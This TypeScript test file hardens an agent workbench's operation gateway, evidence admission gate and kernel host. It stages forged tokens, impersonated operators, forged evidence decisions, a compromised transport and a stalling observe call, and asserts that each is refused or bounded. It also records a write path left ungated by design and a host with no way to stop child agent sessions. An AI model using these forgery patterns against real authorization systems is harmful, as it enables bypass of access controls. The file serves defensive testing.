      for (const suffix of ["", "-wal", "-shm"]) {
        if (existsSync(`${dbPath}${suffix}`)) {
          rmSync(`${dbPath}${suffix}`, { force: true });
        }
      }
    }
    recordAttack("projection.store.sql");
  });

  it("transport.client.rpc — transport authentication never substitutes for Gauntlet operation authority", async () => {
    // A client pointed at the CORRECT transport (right port, right surface) but
    // with wrong/missing credentials is denied by the surface's own auth gate.
    const stub = allowedStub();
    const server = stub.serveHttp();
    try {
      const client = new GauntletReadClient(`127.0.0.1:${server.port}`);
      // (a) no credentials → actor_authentication_required.
      const anonymous = await client.mutateUnit(UNIT, "resolve", { operator: ACTOR, note: NOTE });
      expect(anonymous.ok).toBe(false);
      expect(anonymous.code).toBe("actor_authentication_required");
      // (b) wrong token → invalid_session_credentials.
      const wrongToken = await client.mutateUnit(UNIT, "resolve", {
        operator: ACTOR,
        token: "forged-transport-token",
        note: NOTE,
      });
      expect(wrongToken.ok).toBe(false);
      expect(wrongToken.code).toBe("invalid_session_credentials");
      // (c) valid token, client-asserted operator mismatch → authority refusal.
      const impostor = await client.mutateUnit(UNIT, "resolve", {
        operator: "someone-else",
        token: TOKEN,
        note: NOTE,
      });
      expect(impostor.ok).toBe(false);
      expect(impostor.code).toBe("client_asserted_authority_refused");
      // No refusal echoed the credentials back.
      for (const refusal of [anonymous, wrongToken, impostor]) {
        expect(refusal.message ?? "").not.toContain(TOKEN);
        expect(refusal.message ?? "").not.toContain("forged-transport-token");
      }
      // The consequential ledger never moved: transport auth granted NOTHING.
      expect(stub.sideEffects.settlements_committed).toBe(0);
      expect(stub.sideEffects.tickets_resolved).toBe(0);
    } finally {
      server.stop();
    }
    recordAttack("transport.client.rpc");
  });

  it("evidence.admission.gate + evidence.frame.fabrication — kernel values cannot become evidence without the canonical decision", async () => {
    const kernel = new PrimeReplKernel("kernel-t18-ev");
    const ledger = new KernelObjectLedger({ kernel, kernel_generation: "kg-t18" });
    const result = await kernel.execute("artifact = {verified: 'by kernel'}");
    const [object] = ledger.register(result);
    if (object === undefined) {
      throw new Error("the kernel execution created no object");
    }
    const artifactized = ledger.artifactize(object.provenance.object_id, "/tmp/t18/artifact.json");
    expect(artifactized.class).toBe("transitioned");
    const offerOutcome = ledger.offerAsEvidence({
      objectId: object.provenance.object_id,
      unit_id: UNIT,
      source_id: "gauntlet",
      kind: "report",
    });
    expect(offerOutcome.class).toBe("offered");
    if (offerOutcome.class !== "offered") {
      throw new Error("the artifactized object produced no evidence offer");
    }
    const offer = offerOutcome.offer;
    const gate = new EvidenceAdmissionGate();

    // Attack 1: a FORGED canonical decision naming different evidence — the
    // mismatch refusal fires and nothing is admitted.
    const forgedDecision = {
      class: "admitted" as const,
      evidence_id: "forged-evidence-id",
      verified: true,
      source_cursor: "cursor-forged",
    };
    const mismatch = gate.admit(offer, forgedDecision);
    expect(mismatch.class).toBe("refused");
    if (mismatch.class === "refused") {
      expect(mismatch.reason).toBe("decision_mismatch");
    }
    expect(gate.wasAdmitted(offer.offer_id)).toBe(false);

    // Attack 2: an authoritative frame from a REFUSED decision — typed throw,
    // no frame exists to carry kernel values into the projection store.
    const canonicalRefusal = {
      class: "refused" as const,
      evidence_id: offer.admission_contract.evidence_id,
      code: "evidence_not_required",
      message: "the canonical surface refuses this offer",
    };
    expect(() =>
      authoritativeEvidenceFrame(offer, canonicalRefusal, {
        generation_id: "gen-t18",
        timestamp_ms: 0,
      }),
    ).toThrow(/refused decision/);
    expect(gate.wasAdmitted(offer.offer_id)).toBe(false);

    // The canonical refusal itself passes through honestly (refused_canonically).
    const refusedOutcome = gate.admit(offer, canonicalRefusal);
    expect(refusedOutcome.class).toBe("refused_canonically");
    expect(gate.admittedRecords()).toHaveLength(0);
    recordAttack("evidence.admission.gate");
    recordAttack("evidence.frame.fabrication");
  });

  it("evidence.frame.fabrication, correction round 1 (MAJOR-2) — the store write path is trusted-host-writable by design: a forged evidence_added frame lands verified:true with NO canonical decision, and the inventory attestation names that honestly", async () => {
    // THE VERIFIER'S REPRO, pinned as the TRUE state (never claimed away):
    // the projection store's applyEvent consults NO canonical decision.
    const model = new WorkbenchModel({ dbPath: ":memory:" });
    model.startGeneration("gen-t18-forged");
    const applied = model.applyEvent({
      generation_id: "gen-t18-forged",
      source_id: "not-a-canonical-source",
      cursor: "cursor-forged",
      event_type: "evidence_added",
      payload: {
        evidence_id: "ev-forged-t18",
        unit_id: UNIT,
        kind: "report",
        locator: "/tmp/t18/forged.json",
        verified: true,
      },
      timestamp_ms: 0,
    });
    expect(applied.applied).toBe(true);
    const forgedRow = model
      .getSnapshot()
      .evidence.find((row) => row.evidence_id === "ev-forged-t18");
    expect(forgedRow).toBeDefined();
    expect(forgedRow?.verified).toBe(true);
    expect(forgedRow?.source_id).toBe("not-a-canonical-source");
    // The frame-construction gate was never consulted: no admission exists.
    expect(new EvidenceAdmissionGate().admittedRecords()).toHaveLength(0);

    // MITIGATION 1 — the projection is the noncanonical REBUILDABLE layer: a
    // fresh generation drops the forged row; nothing durable carried it.
    model.startGeneration("gen-t18-clean");
    expect(model.getSnapshot().evidence.some((row) => row.evidence_id === "ev-forged-t18")).toBe(
      false,
    );

    // MITIGATION 2 — nothing consequential reads the projection as authority:
    // with the forged verified row present, a denied operation through the
    // gateway is STILL refused by the canonical path it routes over.
    const stub = deniedStub();
    const gateway = new OperationGateway(stub.asInProcessRoute());
    const outcome = await gateway.invoke(deniedRequest());
    expect(outcome.class).toBe("refused");
    if (outcome.class !== "refused") {
      throw new Error("the denied drive was not refused despite the forged projection row");
    }
    expect(outcome.reason_codes).toContain("authority_not_permitted");
    expect(stub.sideEffects.settlements_committed).toBe(0);
    expect(stub.sideEffects.tickets_resolved).toBe(0);

    // MITIGATION 3 — only trusted same-user host code reaches applyEvent
    // (the declared enforcement scope's first excluded threat class).
    expect(ENFORCEMENT_SCOPE.excluded_threat_classes.join(" ")).toContain(
      "trusted same-user arbitrary code",
    );

    // THE INVENTORY ATTESTATION names the REAL enforcement locus honestly.
    // A "fix" that reverts to claiming the frame-helper gate covers the store
    // write path fails here: the true state must stay visible in the inventory.
    const entry = PRIVILEGED_BOUNDARY_INVENTORY.find(
      (boundary) => boundary.id === "evidence.frame.fabrication",
    );
    if (entry === undefined) {
      throw new Error("the inventory lost the evidence.frame.fabrication entry");
    }
    expect(entry.attack_route).toContain("applyEvent");
    expect(entry.denial_shape).toContain("UNGATED");
    expect(entry.disclosed_bound).toContain("trusted-host-writable");
    expect(entry.disclosed_bound).toContain("REBUILDABLE layer");
    expect(entry.disclosed_bound).toContain("nothing consequential reads it as authority");
    recordAttack("evidence.frame.fabrication");
  });
});

// --- Isolation / liveness claim language (absence-of-claims) ------------------------

describe("T18 isolation-claim language — kernel/worker isolation is NOT a security sandbox; liveness is NOT success (REQ-SEC-001, REQ-SAFE-004)", () => {
  const SOURCES: readonly string[] = [
    "operation-gateway.ts",
    "prime-host.ts",
    "prime-recursion.ts",
    "prime-long-running.ts",
    "prime-context-envelope.ts",
    "prime-kernel.ts",
    "kernel-affordances.ts",
    "evidence-promotion.ts",
    "terminal-session.ts",
    "plugins.ts",
    "live-streams.ts",
    "config.ts",
    "preflight.ts",
    "client.ts",
    "security-hardening.ts",
  ];

  function readSources(): ClaimAuditFile[] {
    return SOURCES.map((name) => ({
      name,
      text: readFileSync(join(import.meta.dir, name), "utf8"),
    }));
  }

  it("no module surface presents isolation as a security sandbox, and every required disclosure is present", () => {
    // security-hardening.ts is EXEMPT from the sandbox-mention scan: its
    // "sandbox" mentions are the meta-discussion of the rule itself (the
    // ENFORCEMENT_SCOPE declaration). Its content is pinned verbatim by the
    // dedicated scope assertion below — nothing is unchecked.
    const audit = auditIsolationClaims(readSources(), {
      sandboxScanExempt: ["security-hardening.ts"],
    });
    expect(audit.unhedged_sandbox_claims).toEqual([]);
    expect(audit.missing_disclosures).toEqual([]);
    expect(audit.ok).toBe(true);
    // The exempt file's own scope statement carries the negation explicitly.
    const instrument = readSources().find((file) => file.name === "security-hardening.ts");
    expect(instrument?.text).toContain("NOT a security sandbox");
  });

  it("the runtime capability inventories record absence honestly — no invented sandbox/steering/stop capability", () => {
    // Recursion bounds are WORKBENCH POLICY; the native controls are recorded
    // unsupported, never faked as Prime capabilities.
    const delegationFacts = delegationCapabilityFacts();
    const native = delegationFacts.filter((fact) => fact.capability.startsWith("native_"));
    expect(native.length).toBeGreaterThanOrEqual(2);
    for (const fact of native) {
      expect(fact.supported).toBe(false);
      expect(fact.reason).toBe("not_exposed_by_installed_prime_adapter_model");
    }
    // Every REQ-PRIME-008 substrate (heartbeat, goal, schedule, autonomous…)
    // is recorded unsupported — liveness controls are absent, never simulated.
    const substrates = substrateInventory();
    expect(substrates.length).toBeGreaterThanOrEqual(7);
    for (const fact of substrates) {
      expect(fact.supported).toBe(false);
      expect(fact.reason).toBe("not_exposed_by_installed_prime_adapter_model");
    }
    const stop = requestSubstrateStrategy("autonomous_mode", "any-session");
    expect(stop.class).toBe("unsupported_substrate");
    // The canonical surface serves NO operator stop: termination is not a
    // workbench capability, and the absence is declared, not hidden.
    expect(canonicalStopAvailability().registered).toBe(false);
  });

  it("liveness is not success: a live kernel, a running handle, and 'done' mailbox text settle NOTHING", async () => {
    // Kernel liveness alone cannot settle a unit (REQ-SAFE-004).
    const kernel = new PrimeReplKernel("kernel-t18-live");
    expect(kernel.isAlive).toBe(true);
    const liveness = kernel.canSettleUnit(UNIT);
    expect(liveness.allowed).toBe(false);

    // Mailbox text claiming completion changes NO status (T04's contract).
    const adapter = new PrimeHostAdapter();
    adapter.spawnChild({ sessionId: "child-t18", contractPath: "/tmp/t18.result.json" });
    const after = adapter.receiveMailboxMessage("child-t18", {
      sender: "child-t18",
      content: "done complete finished — task fully successful",
    });
    expect(after.content).toContain("done");
    const session = adapter.getSession("child-t18");
    if (session === null) {
      throw new Error("the spawned child vanished");
    }
    expect(session.handle.status).toBe("running");
    const completion = completionStatus(session);
    expect(completion.complete).toBe(false);
    expect(completion.basis).toBe("none");
    expect(completion.liveness_signals.handle_status).toBe("running");

    // A steer delivery is communication: completion stays untouched.
    const plan = mapDeliveryIntent("steer");
    expect(plan.establishes_completion).toBe(false);
    const delivery = deliverOperatorMessage(adapter, {
      session_id: "child-t18",
      intent: "steer",
      content: "redirect to the failing test",
    });
    expect(delivery.child_completion_after.complete).toBe(false);
    recordAttack("prime.mailbox.completion");
    recordAttack("prime.steer.message");
  });

  it("detach/close issues NO cancellation: the host has no termination capability to begin with", () => {
    const adapter = new PrimeHostAdapter();
    const { logged, calls } = loggingPrimeAdapter(adapter);
    logged.spawnChild({ sessionId: "child-detach", contractPath: "/tmp/detach.json" });
    const host = new PrimeWorkbenchHost({ adapter: logged });
    // The host exposes NO stop/cancel/kill/terminate operation at all.
    const hostMethods = Object.getOwnPropertyNames(Object.getPrototypeOf(host));
    for (const method of hostMethods) {
      expect(/cancel|stop|kill|terminate/i.test(method)).toBe(false);
    }
    const receipt = host.detach();
    expect(receipt.detached).toBe(true);
    expect(receipt.cancel_calls_issued).toBe(0);
    expect(receipt.sessions_left_authorized).toEqual(["child-detach"]);
    host.close();
    // The adapter saw NO lifecycle call from detach/close: the child keeps living.
    expect(calls.filter((call) => /cancel|stop|kill|terminate/i.test(call))).toEqual([]);
    expect(logged.getSession("child-detach")?.handle.status).toBe("running");
  });
});

// --- Carried trigger-records re-attacked (T09 evidence) ------------------------------

describe("T18 carried trigger-records — compromised transport, non-crypto digest, head-of-line stall", () => {
  it("trigger-record 1 — a compromised transport forges an acceptance: the ledger and fresh observation expose it, and the armed gate-skip is STILL denied by canonical admission (bound recorded)", async () => {
    const stub = allowedStub();
    const stubRoute = stub.asInProcessRoute();
    let honest = false;
    const compromised: OperatorActionRoute = {
      observe: (target) => stubRoute.observe(target),
      perform: async (command) => {
        if (honest) {
          return stubRoute.perform(command);
        }
        // The forged acceptance: right shape, WRONG durable facts.
        return {
          kind: "accepted",
          run_id: "forged-run",
          unit_id: command.unit,
          tickets_resolved: ["forged-ticket"],
          committed_now: true,
        };
      },
    };
    const gateway = new OperationGateway(compromised);
    const forged = await gateway.invoke(deniedRequest());
    expect(forged.class).toBe("accepted");
    if (forged.class !== "accepted") {
      throw new Error("the compromised transport did not forge");
    }
    expect(forged.run_id).toBe("forged-run");

    // INSTRUMENT 1 — the durable ledger: nothing settled, nothing resolved.
    expect(stub.sideEffects.admission_attempts).toBe(0);
    expect(stub.sideEffects.settlements_committed).toBe(0);
    expect(stub.sideEffects.tickets_resolved).toBe(0);
    // INSTRUMENT 2 — a FRESH observation: the escalation is still open; the
    // forged "committed_now: true" is a lie the canonical reads expose.
    const fresh = stub.observe({ unit: UNIT });
    expect(fresh.open_escalations).toEqual([{ ticket_id: TICKET, unit_id: UNIT }]);

    // THE EXPOSURE BOUND (recorded honestly, owning task T09): the forged
    // acceptance ARMED the gateway's re-entry record for that key, so the next
    // same-key drive SKIPS the workbench's fresh descriptor gate — even after
    // the world turns visibly denied. The bypass reaches the transport…
    stub.revokeAuthority(UNIT, true);
    honest = true; // the compromised transport is later replaced by an honest one
    const second = await gateway.invoke(deniedRequest());
    // …and canonical admission STILL decides: the authority refusal lands,
    // zero side effects. The exposure is bounded to (a) misreporting outcomes
    // to the projection and (b) skipping the WORKBENCH gate on one gateway
    // instance — never to canonical authority itself.
    expect(second.class).toBe("refused");
    if (second.class !== "refused") {
      throw new Error("the post-forgery drive was not denied by the honest admission");
    }
    expect(second.code).toBe("authority_not_permitted");
    expect(second.stale).toBe(false);
    expect(stub.sideEffects.settlements_committed).toBe(0);
    expect(stub.sideEffects.tickets_resolved).toBe(0);
  });

  it("trigger-record 4 — the payload digest is a BINDING instrument, not a commitment: deterministic, mismatch-checked, disclosed, boundedly collision-free in a searched sample", async () => {
    // (a) Determinism: two gateways mint the SAME key for the SAME request —
    //     and the independent digest model below reproduces the real minted key.
    const stubA = allowedStub();
    const outcomeA = await new OperationGateway(stubA.asInProcessRoute()).invoke(deniedRequest());
    const stubB = allowedStub();
    const outcomeB = await new OperationGateway(stubB.asInProcessRoute()).invoke(deniedRequest());
    expect(outcomeA.class).toBe("accepted");
    expect(outcomeB.class).toBe("accepted");
    if (outcomeA.class !== "accepted" || outcomeB.class !== "accepted") {
      throw new Error("the digest probe drives were not accepted");
    }
    const keyA = outcomeA.idempotency_key;
    expect(keyA).toBe(outcomeB.idempotency_key);
    expect(stubA.sideEffects.settlements_committed).toBe(1);
    expect(stubB.sideEffects.settlements_committed).toBe(1);
    expect(modelDigest({ note: NOTE, run: null })).toBe(digestSuffixOf(keyA));

    // (b) Mismatch detection: key reuse with a changed payload is refused
    //     BEFORE any routing (the defense is the gate, not key obscurity).
    //     The SAME gateway instance re-drives the key its OWN ledger armed,
    //     on a fresh surface so the first drive can reach admission.
    const stubC = allowedStub();
    const gateway = new OperationGateway(stubC.asInProcessRoute());
    const firstOnShared = await gateway.invoke(deniedRequest());
    expect(firstOnShared.class).toBe("accepted");
    if (firstOnShared.class !== "accepted") {
      throw new Error("the ledger-arming drive was not accepted");
    }
    const mismatch = await gateway.invoke({
      ...deniedRequest(),
      payload: { note: "a DIFFERENT payload under the same key" },
      idempotency_key: firstOnShared.idempotency_key,
    });
    expect(mismatch.class).toBe("refused");
    if (mismatch.class !== "refused") {
      throw new Error("the same-key/different-payload drive was not refused");
    }
    expect(mismatch.code).toBe("idempotency_key_payload_mismatch");
    // No second settlement: the mismatch drive never reached admission.
    expect(stubC.sideEffects.settlements_committed).toBe(1);

    // (c) The disclosure is pinned in the owning module: no cryptographic claim.
    const gatewaySource = readFileSync(join(import.meta.dir, "operation-gateway.ts"), "utf8");
    expect(gatewaySource).toContain("not a cryptographic instrument");

    // (d) Bounded collision search with the INDEPENDENT model (validated
    //     against the real minted key in (a)): no collision in this sample.
    //     This is a BOUNDED absence — the T09 verifier's birthday search found
    //     collisions in principle, and no security claim rests on collision
    //     resistance (admission re-validates the command regardless; the
    //     mismatch detector is defense-in-depth behind the gates).
    const seen = new Map<string, string>();
    let collision: string | null = null;
    for (let index = 0; index < 8192; index += 1) {
      const digest = modelDigest({ note: `t18-collision-search-${index}`, run: null });
      const previous = seen.get(digest);
      if (previous !== undefined) {
        collision = `${previous} vs ${String(index)}`;
        break;
      }
      seen.set(digest, String(index));
    }
    expect(collision).toBeNull();

    function digestSuffixOf(key: string): string {
      // The minted key is `<operation>:<target>:<actor>:<digest>` — the digest
      // is the last colon-separated segment.
      const parts = key.split(":");
      return parts[parts.length - 1] ?? "";
    }
    function modelDigest(payload: { note: string; run?: string | null }): string {
      // Independent reimplementation of the gateway's public doubled-FNV
      // binding digest (documented in operation-gateway.ts), used ONLY to run
      // the bounded collision search and to prove the model faithful in (a).
      const text = JSON.stringify({ note: payload.note, run: payload.run ?? null });
      let h1 = 0x811c9dc5;
      let h2 = 0x01000193;
      for (let index = 0; index < text.length; index += 1) {
        const code = text.charCodeAt(index);
        h1 ^= code;
        h1 = Math.imul(h1, 0x01000193) >>> 0;
        h2 ^= (code + index) & 0xff;
        h2 = Math.imul(h2, 0x85ebca6b) >>> 0;
      }
      return h1.toString(16).padStart(8, "0") + h2.toString(16).padStart(8, "0");
    }
  });

  it("trigger-record 3 — the observe head-of-line stall is real on a raw gateway, and the observe-deadline wrapper closes it with typed fail-closed refusals", async () => {
    let observeCalls = 0;
    let phase: "never" | "healthy" = "never";
    const neverThenHealthy: OperatorActionRoute = {
      observe: (_target) => {
        observeCalls += 1;
        if (phase === "never") {
          return new Promise(() => undefined); // never settles — the DoS shape
        }
        return Promise.resolve(healthyObservation());
      },
      perform: () =>
        Promise.resolve({
          kind: "accepted" as const,
          run_id: RUN,
          unit_id: UNIT,
          tickets_resolved: [],
          committed_now: false,
        }),
    };

    // THE RAW BOUND (demonstrated, not fixed in the gateway): a route whose
    // observe never settles stalls every later drive on that gateway instance.
    const rawGateway = new OperationGateway(neverThenHealthy);
    void rawGateway.invoke(deniedRequest()); // stalls forever (kept unreferenced)
    let settled = false;
    void rawGateway.invoke(deniedRequest()).then(() => {
      settled = true;
    });
    await Bun.sleep(30);
    // The bound: the queued drive is STILL stuck behind the unobserved surface
    // — so far behind it has not even reached its own observe call.
    expect(settled).toBe(false);
    // Fail-closed containment (why this is a DoS bound, not a bypass): the
    // stalled drives route nowhere — exactly one observe call, zero performs.
    expect(observeCalls).toBe(1);

    // THE CLOSURE (T18 composition-level hardening): wrap the route with an
    // observe deadline. The stalled drive becomes the gateway's typed
    // fail-closed refusal, and later drives proceed.
    const wrapped = withObserveDeadline(neverThenHealthy, 15);
    const hardenedGateway = new OperationGateway(wrapped);
    const first = await hardenedGateway.invoke(deniedRequest());
    expect(first.class).toBe("refused");
    if (first.class !== "refused") {
      throw new Error("the deadline wrapper did not fail the stalled drive closed");
    }
    expect(first.code).toBe("revalidation_unavailable");
    expect(first.reason_codes).toEqual(["surface_unreachable"]);
    // The later drive is NOT stalled: the surface (now healthy) serves it.
    phase = "healthy";
    const second = await hardenedGateway.invoke(deniedRequest());
    expect(second.class).toBe("accepted");
    expect(ObserveDeadlineExceededError).toBeDefined();
  });
});

// --- the coverage contract ------------------------------------------------------------

describe("T18 boundary inventory coverage contract", () => {
  it("every inventoried privileged boundary has an executed attack record — a new boundary cannot silently escape the suite", () => {
    expect(PRIVILEGED_BOUNDARY_INVENTORY.length).toBeGreaterThanOrEqual(21);
    assertInventoryAttackCoverage([...EXECUTED_ATTACKS]);
  });

  it("the declared enforcement scope is carried in code exactly as in the evidence", () => {
    expect(ENFORCEMENT_SCOPE.isolation_is_not_sandbox).toContain("NOT a security sandbox");
    expect(ENFORCEMENT_SCOPE.excluded_threat_classes.length).toBeGreaterThanOrEqual(5);
    expect(ENFORCEMENT_SCOPE.authority).toContain("ONE canonical");
  });
});

function healthyObservation(): AffordanceObservation {
  return Object.freeze({
    reachable: true,
    degraded: false,
    units: Object.freeze([Object.freeze({ unit_id: UNIT, status: "blocked" })]),
    open_escalations: Object.freeze([Object.freeze({ ticket_id: TICKET, unit_id: UNIT })]),
    budget_remaining: Object.freeze({ usd_micro: 5_000_000, tokens: 1_000_000 }),
    governance_denied_units: Object.freeze([]),
    authority_revoked_units: Object.freeze([]),
    capabilities: Object.freeze([]),
  });
}
